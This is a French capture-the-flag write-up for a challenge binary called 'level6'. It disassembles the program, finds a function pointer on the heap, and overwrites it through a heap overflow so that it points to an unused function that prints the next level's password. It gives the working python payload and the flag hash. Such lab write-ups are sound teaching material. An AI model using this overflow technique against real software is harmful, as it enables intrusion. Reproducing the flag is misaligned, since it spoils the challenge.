



# level6


## description
- Il y a un exécutable **level6**.
- Lorsqu'on l'exécute sans arguments, il **Segfault**.
- Lorsqu'on l'exécute avec des arguments, il affiche "**Nope**".

## Résolution

Lorsqu'on desassemble le main. on voit deux utilisations de **malloc**.

    (gdb) disas main
    Dump of assembler code for function main:
	[...]
       0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
       0x0804848c <+16>:    call   0x8048350 <malloc@plt>
       0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
       0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
       0x0804849c <+32>:    call   0x8048350 <malloc@plt>
	[...]
    End of assembler dump.
Le premier **malloc** alloue 64 bytes(**0x40**) et le deuxième alloue 4bytes(**0x4** ).
Ce qui fait que le 2e **malloc** est un **pointeur sur fonction** qui pointe sur la fonction **m**. cette fonction sera utilisée plus tard apres un **strcpy**.
Il existe une fonction **n** qui n'est pas utilisée.

       0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0
       0x08048461 <+13>:    call   0x8048370 <system@plt>
system prends en argument **"/bin/cat /home/user/level7/.pass"**.

Notre objectif va être de utiliser un **heap overflow** pour réécrire le pointeur sur fonction avec l'adresse de la fonction n qui va nous afficher le flag.

Grace au pattern generator, on sait que l'on doit faire un padding de **72** avant notre adresse.

on prends l'adresse de **n** et on la reverse **\x54\x84\x04\x08**.

    python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit3 && ./level6 `cat /tmp/exploit3`

On obtient le flag 

    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
